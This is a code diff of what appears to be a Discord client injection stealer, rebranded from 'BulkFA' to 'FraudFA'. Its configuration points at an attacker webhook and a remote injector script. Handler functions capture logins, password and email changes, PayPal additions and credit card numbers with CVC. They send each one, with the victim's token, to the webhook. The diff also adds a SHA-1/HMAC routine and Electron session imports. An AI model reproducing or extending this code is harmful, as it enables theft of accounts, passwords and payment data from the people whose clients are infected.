@@ -1,17 +1,18 @@
-var glob = require("glob");
+const args = process.argv;
 const fs = require('fs');
+const path = require('path');
 const https = require('https');
-const { exec } = require('child_process');
-const buf_replace = require('buffer-replace');
+const querystring = require('querystring');
+const { BrowserWindow, session } = require('electron');
 
 const config = {
   webhook: '%WEBHOOK%', 
   ip: '%IP%',
   auto_buy_nitro: false, 
-  ping_on_run: false, 
+  ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'BulkFA', 
-  embed_icon: 'https://media.discordapp.net/attachments/938721597748031568/939085296107155536/Picsart_22-01-16_16-47-19-734.jpg',
+  embed_name: 'FraudFA', 
+  embed_icon: 'https://cdn.discordapp.com/attachments/985530834029273088/985530841285414912/unknown.png',
   embed_color: 000000, 
   injection_url: 'https://raw.githubusercontent.com/otar120/injector/main/index.js',
   api: 'https://discord.com/api/v9/users/@me',
@@ -40,6 +41,265 @@ const config = {
     ],
   },
 };
+
+function parity_32(x, y, z) {
+  return x ^ y ^ z;
+}
+function ch_32(x, y, z) {
+  return (x & y) ^ (~x & z);
+}
+
+function maj_32(x, y, z) {
+  return (x & y) ^ (x & z) ^ (y & z);
+}
+function rotl_32(x, n) {
+  return (x << n) | (x >>> (32 - n));
+}
+function safeAdd_32_2(a, b) {
+  var lsw = (a & 0xffff) + (b & 0xffff),
+    msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);
+
+  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
+}
+function safeAdd_32_5(a, b, c, d, e) {
+  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),
+    msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);
+
+  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
+}
+function binb2hex(binarray) {
+  var hex_tab = '0123456789abcdef',
+    str = '',
+    length = binarray.length * 4,
+    i,
+    srcByte;
+
+  for (i = 0; i < length; i += 1) {
+    srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8);
+    str += hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf);
+  }
+
+  return str;
+}
+
+function getH() {
+  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
+}
+function roundSHA1(block, H) {
+  var W = [],
+    a,
+    b,
+    c,
+    d,
+    e,
+    T,
+    ch = ch_32,
+    parity = parity_32,
+    maj = maj_32,
+    rotl = rotl_32,
+    safeAdd_2 = safeAdd_32_2,
+    t,
+    safeAdd_5 = safeAdd_32_5;
+
+  a = H[0];
+  b = H[1];
+  c = H[2];
+  d = H[3];
+  e = H[4];
+
+  for (t = 0; t < 80; t += 1) {
+    if (t < 16) {
+      W[t] = block[t];
+    } else {
+      W[t] = rotl(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);
+    }
+
+    if (t < 20) {
+      T = safeAdd_5(rotl(a, 5), ch(b, c, d), e, 0x5a827999, W[t]);
+    } else if (t < 40) {
+      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0x6ed9eba1, W[t]);
+    } else if (t < 60) {
+      T = safeAdd_5(rotl(a, 5), maj(b, c, d), e, 0x8f1bbcdc, W[t]);
+    } else {
+      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0xca62c1d6, W[t]);
+    }
+
+    e = d;
+    d = c;
+    c = rotl(b, 30);
+    b = a;
+    a = T;
+  }
+
+  H[0] = safeAdd_2(a, H[0]);
+  H[1] = safeAdd_2(b, H[1]);
+  H[2] = safeAdd_2(c, H[2]);
+  H[3] = safeAdd_2(d, H[3]);
+  H[4] = safeAdd_2(e, H[4]);
+
+  return H;
+}
+
+function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
+  var i, appendedMessageLength, offset;
+
+  offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;
+  while (remainder.length <= offset) {
+    remainder.push(0);
+  }
+  remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));
+  remainder[offset] = remainderBinLen + processedBinLen;
+  appendedMessageLength = remainder.length;
+
+  for (i = 0; i < appendedMessageLength; i += 16) {
+    H = roundSHA1(remainder.slice(i, i + 16), H);
+  }
+  return H;
+}
+
+function hex2binb(str, existingBin, existingBinLen) {
+  var bin,
+    length = str.length,
+    i,
+    num,
+    intOffset,
+    byteOffset,
+    existingByteLen;
+
+  bin = existingBin || [0];
+  existingBinLen = existingBinLen || 0;
+  existingByteLen = existingBinLen >>> 3;
+
+  if (0 !== length % 2) {
+    console.error('String of HEX type must be in byte increments');
+  }
+
+  for (i = 0; i < length; i += 2) {
+    num = parseInt(str.substr(i, 2), 16);
+    if (!isNaN(num)) {
+      byteOffset = (i >>> 1) + existingByteLen;
+      intOffset = byteOffset >>> 2;
+      while (bin.length <= intOffset) {
+        bin.push(0);
+      }
+      bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));
+    } else {
+      console.error('String of HEX type contains invalid characters');
+    }
+  }
+
+  return { value: bin, binLen: length * 4 + existingBinLen };
+}
+
+class jsSHA {
+  constructor() {
+    var processedLen = 0,
+      remainder = [],
+      remainderLen = 0,
+      intermediateH,
+      converterFunc,
+      outputBinLen,
+      variantBlockSize,
+      roundFunc,
+      finalizeFunc,
+      finalized = false,
+      hmacKeySet = false,
+      keyWithIPad = [],
+      keyWithOPad = [],
+      numRounds,
+      numRounds = 1;
+
+    converterFunc = hex2binb;
+
+    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {
+      console.error('numRounds must a integer >= 1');
+    }
+    variantBlockSize = 512;
+    roundFunc = roundSHA1;
+    finalizeFunc = finalizeSHA1;
+    outputBinLen = 160;
+    intermediateH = getH();
+
+    this.setHMACKey = function (key) {
+      var keyConverterFunc, convertRet, keyBinLen, keyToUse, blockByteSize, i, lastArrayIndex;
+      keyConverterFunc = hex2binb;
+      convertRet = keyConverterFunc(key);
+      keyBinLen = convertRet['binLen'];
+      keyToUse = convertRet['value'];
+      blockByteSize = variantBlockSize >>> 3;
+      lastArrayIndex = blockByteSize / 4 - 1;
+
+      if (blockByteSize < keyBinLen / 8) {
+        keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());
+        while (keyToUse.length <= lastArrayIndex) {
+          keyToUse.push(0);
+        }
+        keyToUse[lastArrayIndex] &= 0xffffff00;
+      } else if (blockByteSize > keyBinLen / 8) {
+        while (keyToUse.length <= lastArrayIndex) {
+          keyToUse.push(0);
+        }
+        keyToUse[lastArrayIndex] &= 0xffffff00;
+      }
+
+      for (i = 0; i <= lastArrayIndex; i += 1) {
+        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;
+        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;
+      }
+
+      intermediateH = roundFunc(keyWithIPad, intermediateH);
+      processedLen = variantBlockSize;
+
+      hmacKeySet = true;
+    };
+
+    this.update = function (srcString) {
+      var convertRet,
+        chunkBinLen,
+        chunkIntLen,
+        chunk,
+        i,
+        updateProcessedLen = 0,
+        variantBlockIntInc = variantBlockSize >>> 5;
+
+      convertRet = converterFunc(srcString, remainder, remainderLen);
+      chunkBinLen = convertRet['binLen'];
+      chunk = convertRet['value'];
+
+      chunkIntLen = chunkBinLen >>> 5;
+      for (i = 0; i < chunkIntLen; i += variantBlockIntInc) {
+        if (updateProcessedLen + variantBlockSize <= chunkBinLen) {
+          intermediateH = roundFunc(chunk.slice(i, i + variantBlockIntInc), intermediateH);
+          updateProcessedLen += variantBlockSize;
+        }
+      }
+      processedLen += updateProcessedLen;
+      remainder = chunk.slice(updateProcessedLen >>> 5);
+      remainderLen = chunkBinLen % variantBlockSize;
+    };
+
+    this.getHMAC = function () {
+      var firstHash;
+
+      if (false === hmacKeySet) {
+        console.error('Cannot call getHMAC without first setting HMAC key');
+      }
+
+      const formatFunc = function (binarray) {
+        return binb2hex(binarray);
+      };
+
+      if (false === finalized) {
+        firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);
+        intermediateH = roundFunc(keyWithOPad, getH());
+        intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);
+      }
+
+      finalized = true;
+      return formatFunc(intermediateH);
+    };
+  }
+}
 
 if ('function' === typeof define && define['amd']) {
   define(function () {
@@ -387,13 +647,13 @@ const login = async (email, password, token) => {
         ],
         author: {
           name: json.username + '#' + json.discriminator + ' - ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          icon_url: `https://cdn.discordapp.com/attachments/985530834029273088/985530841285414912/unknown.png`,
         },
         footer: {
-          text: 'BulkFA',
+          text: 'Fraud',
         },
         thumbnail: {
-          url: 'https://media.discordapp.net/attachments/938721597748031568/939085296107155536/Picsart_22-01-16_16-47-19-734.jpg',
+          url: 'https://cdn.discordapp.com/attachments/985530834029273088/985530841285414912/unknown.png',
         },
       },
     ],
@@ -435,7 +695,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BulkFA',
+          text: 'FraudFA',
         },
       },
     ],
@@ -477,7 +737,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BulkFA',
+          text: 'FraudFA',
         },
       },
     ],
@@ -519,7 +779,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BulkFA',
+          text: 'FraudFA',
         },
       },
     ],
@@ -561,7 +821,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BulkFA',
+          text: 'FraudFA',
         },
       },
     ],
@@ -605,7 +865,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BulkFA',
+          text: 'FraudFA',
         },
       },
     ],
